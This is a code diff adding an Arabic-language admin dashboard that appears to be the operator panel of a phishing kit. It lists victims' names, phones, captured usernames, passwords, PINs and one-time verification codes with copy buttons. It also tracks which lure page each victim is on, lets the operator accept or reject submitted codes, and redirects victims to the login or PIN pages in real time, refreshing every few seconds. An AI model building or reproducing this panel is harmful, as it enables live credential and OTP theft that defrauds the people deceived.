@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة الإدارة</title>
+<style>
+  :root{--bg:#f0f2f5;--card:#fff;--ink:#1a1a2e;--muted:#6b7280;--line:#e5e7eb;
+    --green:#059669;--red:#dc2626;--orange:#d97706;--blue:#2563eb;--purple:#7c3aed;
+    --sidebar:#1a1a2e;--sidebar-w:260px}
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:var(--bg);color:var(--ink);font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100%}
+
+  /* === Login === */
+  .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
+    background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
+  .login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
+    box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
+  .login-box h1{font-size:28px;font-weight:800;margin-bottom:6px;color:var(--ink)}
+  .login-box p{color:var(--muted);font-size:14px;margin-bottom:30px}
+  .login-box input{width:100%;padding:16px 20px;border:2px solid var(--line);border-radius:14px;
+    font-size:16px;font-family:inherit;text-align:center;outline:none;margin-bottom:18px;transition:.2s}
+  .login-box input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(37,99,235,.1)}
+  .login-box button{width:100%;padding:16px;background:var(--blue);color:#fff;border:none;
+    border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
+  .login-box button:hover{background:#1d4ed8}
+  .login-err{color:var(--red);font-size:13px;margin-bottom:12px;display:none}
+
+  /* === Layout === */
+  .layout{display:none;min-height:100vh}
+
+  .main{padding:28px 32px;min-height:100vh}
+
+  /* === Header === */
+  .top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px}
+  .top-bar h1{font-size:26px;font-weight:800}
+  .top-bar-actions{display:flex;align-items:center;gap:12px}
+  .btn-refresh{display:flex;align-items:center;gap:6px;padding:10px 20px;background:var(--card);
+    border:1.5px solid var(--line);border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;
+    font-family:inherit;transition:.2s}
+  .btn-refresh:hover{background:var(--bg);border-color:var(--ink)}
+  .btn-refresh svg{width:16px;height:16px;fill:var(--muted)}
+  .auto-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
+
+  /* === Stats === */
+  .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:28px}
+  .stat-card{background:var(--card);border-radius:16px;padding:22px 24px;
+    box-shadow:0 1px 3px rgba(0,0,0,.06);position:relative;overflow:hidden}
+  .stat-card::after{content:"";position:absolute;top:0;right:0;width:4px;height:100%;border-radius:0 16px 16px 0}
+  .stat-card.s-active::after{background:var(--green)}
+  .stat-card.s-total::after{background:var(--blue)}
+  .stat-card.s-pending::after{background:var(--orange)}
+  .stat-card.s-confirmed::after{background:var(--green)}
+  .stat-label{font-size:13px;color:var(--muted);font-weight:500;margin-bottom:8px;
+    display:flex;align-items:center;gap:8px}
+  .stat-label svg{width:18px;height:18px}
+  .stat-num{font-size:32px;font-weight:800;letter-spacing:-1px}
+  .stat-card.s-active .stat-num{color:var(--green)}
+  .stat-card.s-total .stat-num{color:var(--blue)}
+  .stat-card.s-pending .stat-num{color:var(--orange)}
+  .stat-card.s-confirmed .stat-num{color:var(--green)}
+  .wifi-icon{display:inline-flex;align-items:center;gap:4px}
+  .wifi-icon svg{width:16px;height:16px;fill:var(--green);animation:pulse 1.5s infinite}
+
+  /* === Table === */
+  .table-card{background:var(--card);border-radius:16px;box-shadow:0 1px 3px rgba(0,0,0,.06);overflow:hidden}
+  .table-header{padding:20px 24px;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between}
+  .table-header h2{font-size:18px;font-weight:700}
+  .table-count{font-size:13px;color:var(--muted);background:var(--bg);padding:4px 12px;border-radius:20px}
+
+  table{width:100%;border-collapse:collapse}
+  thead th{padding:14px 16px;text-align:right;font-size:12px;font-weight:600;color:var(--muted);
+    text-transform:uppercase;letter-spacing:.5px;background:#fafbfc;border-bottom:1px solid var(--line)}
+  tbody tr{border-bottom:1px solid var(--line);transition:.15s}
+  tbody tr:last-child{border:none}
+  tbody tr:hover{background:#f8f9fb}
+  tbody td{padding:14px 16px;font-size:14px;vertical-align:middle}
+
+  .td-user{display:flex;align-items:center;gap:12px}
+  .td-watch{width:44px;height:44px;border-radius:50%;background:#f5f5f5;border:2px solid var(--line);
+    display:flex;align-items:center;justify-content:center;padding:4px;flex-shrink:0}
+  .td-watch img{max-width:100%;max-height:100%;object-fit:contain}
+  .td-name{font-weight:600;font-size:14px}
+  .td-phone{font-size:12px;color:var(--muted);direction:ltr;text-align:right;margin-top:2px}
+
+  .badge{padding:4px 12px;border-radius:20px;font-size:11px;font-weight:700;display:inline-block}
+  .badge-pending{background:#fef3c7;color:#92400e}
+  .badge-confirmed{background:#d1fae5;color:#065f46}
+  .badge-rejected{background:#fee2e2;color:#991b1b}
+  .badge-code_pending{background:#e0e7ff;color:#3730a3}
+  .badge-code_confirmed{background:#d1fae5;color:#065f46}
+  .badge-code_rejected{background:#fee2e2;color:#991b1b}
+  .badge-page{background:#dbeafe;color:#1e40af}
+
+  .td-actions{display:flex;gap:6px}
+  .td-actions button{border:none;padding:8px 14px;border-radius:8px;font-size:12px;
+    font-weight:600;cursor:pointer;font-family:inherit;transition:.15s}
+  .btn-details{background:#eff6ff;color:var(--blue)}
+  .btn-details:hover{background:#dbeafe}
+  .btn-redirect{background:#f3f4f6;color:var(--ink)}
+  .btn-redirect:hover{background:#e5e7eb}
+  .btn-delete{background:#fef2f2;color:var(--red)}
+  .btn-delete:hover{background:#fee2e2}
+
+  .empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:15px}
+
+  /* === Modal === */
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:200;
+    display:none;align-items:center;justify-content:center;padding:16px;backdrop-filter:blur(4px)}
+  .modal-overlay.open{display:flex}
+  .modal{background:#fff;border-radius:24px;width:100%;max-width:520px;max-height:90vh;
+    overflow-y:auto;padding:32px;position:relative}
+  .modal-close{position:absolute;top:16px;left:16px;border:none;background:#f3f4f6;
+    width:32px;height:32px;border-radius:50%;font-size:18px;cursor:pointer;color:var(--muted);
+    display:flex;align-items:center;justify-content:center;transition:.2s}
+  .modal-close:hover{background:#e5e7eb}
+  .modal h2{font-size:22px;font-weight:800;margin-bottom:24px}
+  .modal-watch{text-align:center;margin-bottom:20px}
+  .modal-watch img{width:110px;height:110px;object-fit:contain;
+    background:#f9fafb;border-radius:50%;padding:12px;border:2px solid var(--line)}
+  .modal-watch .color-name{font-size:14px;font-weight:600;margin-top:10px;color:var(--muted)}
+  .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px}
+  .detail-item{background:var(--bg);padding:14px 16px;border-radius:14px}
+  .detail-item .lbl{font-size:11px;color:var(--muted);margin-bottom:4px;font-weight:500}
+  .detail-item .val{font-size:14px;font-weight:600;word-break:break-word}
+  .detail-full{grid-column:1/-1}
+  .modal-actions{display:flex;gap:12px}
+  .modal-actions button{flex:1;padding:16px;border:none;border-radius:14px;font-size:15px;
+    font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
+  .btn-accept{background:var(--green);color:#fff}
+  .btn-accept:hover{background:#047857}
+  .btn-reject{background:var(--red);color:#fff}
+  .btn-reject:hover{background:#b91c1c}
+
+  .redirect-options{display:flex;flex-direction:column;gap:10px;margin-bottom:20px}
+  .redirect-options button{padding:16px;border:2px solid var(--line);background:#fff;
+    border-radius:14px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;
+    text-align:right;transition:.2s}
+  .redirect-options button:hover{background:var(--bg);border-color:var(--blue)}
+
+  .login-data{margin-top:12px;padding-top:12px;border-top:1px solid var(--line)}
+  .login-data h3{font-size:14px;font-weight:700;margin-bottom:10px;color:var(--purple)}
+  .cred-row{display:flex;align-items:center;justify-content:space-between;
+    background:var(--bg);border-radius:10px;padding:10px 14px;margin-bottom:8px}
+  .cred-row .cred-label{font-size:11px;color:var(--muted);font-weight:500}
+  .cred-row .cred-val{font-family:monospace;font-size:15px;font-weight:700;
+    direction:ltr;letter-spacing:2px;color:var(--purple);white-space:nowrap}
+  .cred-row .cred-val.code-val{color:#1565c0;font-size:18px;letter-spacing:4px}
+  .cred-right{display:flex;align-items:center;gap:8px}
+  .cred-copy{background:none;border:1px solid var(--line);cursor:pointer;padding:5px 8px;
+    border-radius:6px;color:var(--muted);transition:.15s;display:flex;align-items:center;gap:4px;font-size:11px;font-family:inherit}
+  .cred-copy:hover{border-color:var(--purple);color:var(--purple);background:#f5f3ff}
+  .cred-copy svg{width:14px;height:14px}
+  .cred-copy.copied{border-color:#2e7d32;color:#2e7d32;background:#e8f5e9}
+
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+  .td-login{font-family:monospace;font-size:13px;direction:ltr;text-align:left;font-weight:600;
+    color:var(--purple);letter-spacing:1px;white-space:nowrap;display:inline-block;
+    background:#f5f3ff;padding:4px 10px;border-radius:6px}
+  .td-login-wrap{display:flex;align-items:center;gap:6px;direction:ltr}
+  .copy-btn{background:none;border:none;cursor:pointer;padding:2px;border-radius:4px;
+    color:var(--muted);transition:.15s;display:flex;align-items:center}
+  .copy-btn:hover{color:var(--purple);background:#f0ecff}
+  .copy-btn svg{width:15px;height:15px}
+  .copy-btn.copied{color:#2e7d32}
+  table{table-layout:auto}
+  tbody td,thead th{white-space:nowrap}
+
+  @media(max-width:900px){
+    .main{padding:16px}
+    .stats-row{grid-template-columns:repeat(2,1fr);gap:10px}
+    .table-card{overflow-x:auto}
+    .td-actions{flex-wrap:wrap}
+    .detail-grid{grid-template-columns:1fr}
+    .detail-full{grid-column:1}
+  }
+</style>
+</head>
+<body>
+
+<!-- Login Screen -->
+<div class="login-wrap" id="loginScreen">
+  <div class="login-box">
+    <h1>لوحة الإدارة</h1>
+    <p>أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
+    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
+    <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
+    <button onclick="doLogin()">دخول</button>
+  </div>
+</div>
+
+<!-- Dashboard Layout -->
+<div class="layout" id="layout">
+
+  <!-- Main Content -->
+  <div class="main">
+    <div class="top-bar">
+      <h1>إدارة الطلبات</h1>
+      <div class="top-bar-actions">
+        <div class="auto-dot" title="تحديث تلقائي كل 3 ثواني"></div>
+        <button class="btn-refresh" onclick="loadOrders();loadActiveVisitors()">
+          <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.96 7.96 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+          تحديث
+        </button>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-card s-active">
+        <div class="stat-label">
+          <span class="wifi-icon"><svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.24 4.24 0 0 0-6 0zm-4-4l2 2a7.07 7.07 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></span>
+          نشط الآن
+        </div>
+        <div class="stat-num" id="sActive">0</div>
+      </div>
+      <div class="stat-card s-total">
+        <div class="stat-label">إجمالي الطلبات</div>
+        <div class="stat-num" id="sTotal">0</div>
+      </div>
+      <div class="stat-card s-pending">
+        <div class="stat-label">قيد الانتظار</div>
+        <div class="stat-num" id="sPending">0</div>
+      </div>
+      <div class="stat-card s-confirmed">
+        <div class="stat-label">مقبول</div>
+        <div class="stat-num" id="sConfirmed">0</div>
+      </div>
+    </div>
+
+    <!-- Orders Table -->
+    <div class="table-card">
+      <div class="table-header">
+        <h2>جميع الطلبات</h2>
+        <span class="table-count" id="tableCount">0 طلب</span>
+      </div>
+      <div id="ordersList"></div>
+    </div>
+  </div>
+</div>
+
+<!-- Details Modal -->
+<div class="modal-overlay" id="detailsModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('detailsModal')">×</button>
+    <h2>تفاصيل الطلب</h2>
+    <div class="modal-watch" id="modalWatch"></div>
+    <div class="detail-grid" id="modalDetails"></div>
+    <div class="modal-actions">
+      <button class="btn-accept" id="modalAccept">قبول الطلب</button>
+      <button class="btn-reject" id="modalReject">رفض الطلب</button>
+    </div>
+  </div>
+</div>
+
+<!-- Redirect Modal -->
+<div class="modal-overlay" id="redirectModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('redirectModal')">×</button>
+    <h2>إعادة توجيه الزائر</h2>
+    <div class="redirect-options">
+      <button onclick="doRedirect('index.html')">الصفحة الرئيسية</button>
+      <button onclick="doRedirect('order.html')">صفحة بيانات الطلب</button>
+      <button onclick="doRedirect('login.html')">صفحة تسجيل الدخول</button>
+      <button onclick="doRedirect('password.html')">صفحة الرمز السري</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const pageLabels = {
+  "index":"الرئيسية","order":"صفحة الطلب",
+  "login":"تسجيل الدخول","password":"الرمز السري",
+  "waiting":"جاري التحقق","code":"رمز التحقق","code-waiting":"تحقق الرمز",
+  "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
+};
+
+const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"بانتظار الرمز",code_confirmed:"تم التأكيد",code_rejected:"رمز مرفوض"};
+
+let TOKEN = localStorage.getItem("admin_token") || "";
+let orders = [];
+let currentOrderId = null;
+
+function api(method, url, body) {
+  const opts = {method, headers:{"Content-Type":"application/json"}};
+  if (TOKEN) opts.headers["Authorization"] = "Bearer " + TOKEN;
+  if (body) opts.body = JSON.stringify(body);
+  return fetch(url, opts).then(r => {
+    if (r.status === 401 && url !== "/api/admin/login") {
+      TOKEN = "";
+      localStorage.removeItem("admin_token");
+      document.getElementById("layout").style.display = "none";
+      document.getElementById("loginScreen").style.display = "flex";
+      return r.json();
+    }
+    return r.json();
+  });
+}
+
+async function doLogin() {
+  const pass = document.getElementById("passInput").value;
+  const res = await api("POST", "/api/admin/login", {password: pass});
+  if (res.success) {
+    TOKEN = res.token;
+    localStorage.setItem("admin_token", TOKEN);
+    showDashboard();
+  } else {
+    document.getElementById("loginErr").style.display = "block";
+  }
+}
+document.getElementById("passInput").addEventListener("keydown", e => {
+  if (e.key === "Enter") doLogin();
+});
+
+async function checkAuth() {
+  if (!TOKEN) return;
+  try {
+    const res = await fetch("/api/orders", {headers:{"Authorization":"Bearer "+TOKEN}});
+    if (res.status === 200) {
+      const data = await res.json();
+      if (data.orders && data.orders.length >= 0) { showDashboard(); return; }
+    }
+  } catch(e) {}
+  TOKEN = "";
+  localStorage.removeItem("admin_token");
+}
+
+function showDashboard() {
+  document.getElementById("loginScreen").style.display = "none";
+  document.getElementById("layout").style.display = "block";
+  loadOrders();
+  loadActiveVisitors();
+}
+
+async function loadOrders() {
+  const res = await api("GET", "/api/orders");
+  orders = res.orders || [];
+
+  document.getElementById("sTotal").textContent = orders.length;
+  document.getElementById("sPending").textContent = orders.filter(o=>o.status==="pending").length;
+  document.getElementById("sConfirmed").textContent = orders.filter(o=>o.status==="confirmed").length;
+  document.getElementById("tableCount").textContent = orders.length + " طلب";
+
+  const list = document.getElementById("ordersList");
+  if (!orders.length) {
+    list.innerHTML = '<div class="empty">لا توجد طلبات بعد</div>';
+    return;
+  }
+
+  let html = `<table><thead><tr>
+    <th>العميل</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
+  </tr></thead><tbody>`;
+
+  orders.forEach(o => {
+    const statusClass = o.status || "pending";
+    const pageName = pageLabels[o.current_page] || o.current_page || "—";
+    const date = o.created_at ? new Date(o.created_at).toLocaleDateString("ar-EG",{day:"numeric",month:"short"}) : "—";
+
+    html += `<tr>
+      <td><div class="td-user">
+        <div><div class="td-name">${o.name}</div><div class="td-phone">${o.phone}</div></div>
+      </div></td>
+      <td><div class="td-login-wrap"><span class="td-login">${o.login_username||"—"}</span>${o.login_username?`<button class="copy-btn" onclick="copyText(this,'${o.login_username}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
+      <td><div class="td-login-wrap"><span class="td-login">${o.login_password||"—"}</span>${o.login_password?`<button class="copy-btn" onclick="copyText(this,'${o.login_password}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
+      <td><div class="td-login-wrap"><span class="td-login" style="${o.verification_code?'color:#1565c0':''}">${o.verification_code||"—"}</span>${o.verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
+      <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
+      <td><span class="badge badge-page">${pageName}</span></td>
+      <td style="font-size:12px;color:var(--muted)">${date}</td>
+      <td><div class="td-actions">
+        <button class="btn-details" onclick="showDetails(${o.id})">التفاصيل</button>
+        <button class="btn-redirect" onclick="showRedirect(${o.id})">توجيه</button>
+        <button class="btn-delete" onclick="deleteOrder(${o.id})">حذف</button>
+      </div></td>
+    </tr>`;
+  });
+
+  html += "</tbody></table>";
+  list.innerHTML = html;
+}
+
+function showDetails(id) {
+  const o = orders.find(x => x.id === id);
+  if (!o) return;
+  currentOrderId = id;
+
+  document.getElementById("modalWatch").innerHTML = '';
+
+  let detailsHtml = `
+    <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name}</div></div>
+    <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone}</div></div>
+    <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${statusLabels[o.status]||o.status}</div></div>
+    <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
+    <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${new Date(o.created_at).toLocaleString("ar-EG")}</div></div>`;
+
+  const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
+
+  if (o.login_username || o.login_password) {
+    detailsHtml += `</div><div class="login-data"><h3>بيانات تسجيل الدخول</h3>`;
+    if (o.login_username) {
+      detailsHtml += `<div class="cred-row"><div><div class="cred-label">اسم المستخدم</div><div class="cred-val">${o.login_username}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.login_username}')">${copyIcon} نسخ</button></div></div>`;
+    }
+    if (o.login_password) {
+      detailsHtml += `<div class="cred-row"><div><div class="cred-label">الرمز السري</div><div class="cred-val">${o.login_password}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.login_password}')">${copyIcon} نسخ</button></div></div>`;
+    }
+  }
+
+  if (o.verification_code) {
+    if (!o.login_username && !o.login_password) detailsHtml += `</div><div class="login-data">`;
+    detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز التحقق</div><div class="cred-val code-val">${o.verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.verification_code}')">${copyIcon} نسخ</button></div></div>`;
+  }
+
+  document.getElementById("modalDetails").innerHTML = detailsHtml;
+
+  const acceptBtn = document.getElementById("modalAccept");
+  const rejectBtn = document.getElementById("modalReject");
+  if (o.status === "code_pending") {
+    acceptBtn.textContent = "قبول الرمز";
+    rejectBtn.textContent = "رفض الرمز";
+    acceptBtn.onclick = () => updateStatus(id, "code_confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "code_rejected");
+  } else {
+    acceptBtn.textContent = "قبول";
+    rejectBtn.textContent = "رفض";
+    acceptBtn.onclick = () => updateStatus(id, "confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "rejected");
+  }
+
+  openModal("detailsModal");
+}
+
+let redirectOrderId = null;
+function showRedirect(id) {
+  redirectOrderId = id;
+  openModal("redirectModal");
+}
+
+async function doRedirect(page) {
+  if (!redirectOrderId) return;
+  await api("PATCH", "/api/orders/" + redirectOrderId, {redirect_to: page});
+  closeModal("redirectModal");
+  loadOrders();
+}
+
+async function updateStatus(id, status) {
+  await api("PATCH", "/api/orders/" + id, {status});
+  closeModal("detailsModal");
+  loadOrders();
+}
+
+function copyCred(btn, text) {
+  const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.classList.add("copied");
+    btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> تم';
+    setTimeout(() => { btn.classList.remove("copied"); btn.innerHTML = copyIcon + " نسخ"; }, 1500);
+  });
+}
+
+function copyText(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.classList.add("copied");
+    btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>';
+    setTimeout(() => {
+      btn.classList.remove("copied");
+      btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>';
+    }, 1500);
+  });
+}
+
+async function deleteOrder(id) {
+  if (!confirm("هل تريد حذف هذا الطلب؟")) return;
+  await api("DELETE", "/api/orders/" + id);
+  loadOrders();
+}
+
+function openModal(id) { document.getElementById(id).classList.add("open"); }
+function closeModal(id) { document.getElementById(id).classList.remove("open"); }
+document.querySelectorAll(".modal-overlay").forEach(el => {
+  el.addEventListener("click", e => { if (e.target === el) el.classList.remove("open"); });
+});
+
+async function loadActiveVisitors() {
+  if (!TOKEN) return;
+  const res = await api("GET", "/api/visitors/active");
+  document.getElementById("sActive").textContent = res.count || 0;
+}
+
+checkAuth();
+setInterval(() => { if (TOKEN) { loadOrders(); loadActiveVisitors(); } }, 3000);
+</script>
+</body>
+</html>
